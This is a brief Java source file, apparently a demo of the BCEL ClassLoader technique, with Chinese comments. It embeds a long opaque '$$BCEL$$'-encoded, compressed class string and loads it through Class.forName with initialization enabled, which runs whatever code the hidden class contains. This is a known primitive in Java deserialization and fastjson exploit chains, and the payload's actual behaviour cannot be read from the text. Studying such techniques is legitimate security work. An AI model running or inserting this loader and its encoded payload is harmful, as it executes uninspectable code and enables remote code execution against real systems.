package com.bcel;

import org.apache.bcel.classfile.Utility;
import org.apache.bcel.util.ClassLoader;


public class BCELClassLoader {


    public static void bcel() throws Exception {

        // 创建BCEL类加载器
        ClassLoader classLoader = new ClassLoader();

        // BCEL编码类字节码
        String className = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85TmS$hU$Y$3d$97$bc$ec$b2$y$q$qB$J$f5$r$a8m$D$b4$89$d6jk$8a$a8$8dE$90$A5$a1P$daj$e7fs$L$5b7$bb$99$dd$8d$d2$9f$e2$_$e8$e7$fa$B$3av$c6$l$e0$3f$f2$83$8eg$93$94$UI$c7L$e6$d9$7d$ce$f3$7e$9e$bb$f7$cf$7f$7e$ff$D$c05$3c20$85$8fu$5c$d5$f1$89A$fdS$j$9f$Z$b8$8e$h$3a$3e$d7Q$d6q$d3$c0$S$be$88$c4$b2$81$_$f1$95$86$afGq$L$V$D$e3$f8F$c3m$Di$ach$f8$d6$40$G$ab$g$d64$7c$t$90$5c$b2$5d$3b$5c$W$88$V$e6w$E$e2$V$af$a9$ERU$dbU$9b$9dVC$f9$db$b2$e1$Q$c9T$3dK$3a$3b$d2$b7$p$bd$P$c6$c3$D$3b$88l$96$d7$w5$y$e5$94$w$5e$ab$r$dd$e6M$B$7d$c9r$fa$a9$b5$b6$efY$w$a0g$b6$faD$fe$yK$8et$f7Kwz$m$5dGlW$60$aag$b2$bd$d2$9a$db$ee$84$f5$d0W$b2E$e3$98$3dP$d9$a5$j$f8$C$e7$87$f9$d6$94l$w$3fJ$d7$a0$cb$cc$89$cb$ad$ce$e3$c7$caW$cd$T$bbP$a7$aam$dd$3e$b4T$3b$b4$3d$976$cd$ea$N$Q$N5h$95$Flw$9f$e6$a4$Xl$ca$W$e3$c7$eb$a1$b4$7e$da$90$ed$$$T$g$d6$c9$ab$80Q$f7$3a$be$a5V$ec$88$i$b3$cfE1$cacb$g$e7$E$a6$bd$b6r$f3Wd$be$o$j$ab$e3$c8$d0$f3$8b$b2$ddf$5d$_$u$ba$cc$ac$a1jb$D$9bDvm$b7$e9$fd$S0$b7$89$z$dc$n$db$5c$80$r$90$e0n$3a$87$Ci$ab$e3$3b$f9$a6$h8$de$7e1Z$80$86$efM$d4P7$b1$8d$bb$gvL$ec$e2$9e$40$ee$8d$5ci$d83q$l$P$a2$e6$k$b2$b9$e1$8cE$d6$l$b8$ba$n$84$99$f81$9a$w$fd$df$f5$T$g$90$b7$d5x$a2$ac$f0$U$d4$e3$f34$f44$I$V$X$3c$b6$afB$9e$8c$b6$f2$c3$a7$C$X$Lg$b70$3fl1F$QJ$3f$Mv$ed$f0$80$cb$j$Wu_$60r$80$d6$3anhG$8b4X$efD$99$w$bc$9e$bc$P3$7b$5c$j$w2$7f$e9$7f$ba$Z$9c$e8$c93$a0$c0$E$x$ad$bd$7e$96$cf$bd$aav$e6$cc$cfua$97$b8u$m$fd$40$85$acFZ$a5$df$ac$f4t$a6K$dc$dd$5eytC$60$b6z$c6$b9$ef$c4DW$LC$x$bc9$q$ba$D$b2$83$a0$fe7$T$a1$a96$e7$N$bb$c7$7e$db$97$96$c2$i$de$e2$85$U$fdF$m$a2$e3M9C$ad$c4$a7$e03$b1p$M$f1$bck$ceQ$s$bb$e0$uf$v$cd$9e$D$ce$e3m$3eu$bc$f3$wX$5c$40$i$g$b1$87$99$91$f5L$ec$F$e2$d5$c5L$e2$I$c9_1$9a$d1$d6$9fae1$a3$f7$d5Q$aa$d7_$c0X8$c2$d8$c6$e5$p$98$9b$91$u$c7_b$7c$_$X$ff$N$T$c7H$95$T$_$91$de$cb$r$8e1YN$3e$83$k$f9e$9f$b3$d6$r$d4$b1$c3$7b0$d6$edm$Z$v$ca1j$e3$ec0E$3c$cdn2$i1K$cfi$8e4$c3$Lw$We$f6$bb$8aw$Z$fb$3e$a3$f3$fc$be$e6$f0$A$X$bb3$d58G$J$l$d2$fa$k$t$beF$99$a75$c6$98$i$bd$e78$d7$w$x$7c$40$8f$E$e3$81$L$8cK2C$9c$V$K$8c$88$e1$k$e6$b1$d0$e5$a8$86E$be$J$5c$a6$96E$fco$cch$b8$c2$ff$84$ab$a1$f8$XC$EKE$c4$7e$f4$_$af$pH$dd$k$G$A$A";
        Class<?> clazz = Class.forName(className, true, classLoader);

        System.out.println(clazz);
    }

    public static void main(String[] args) throws Exception {
        bcel();
    }

}
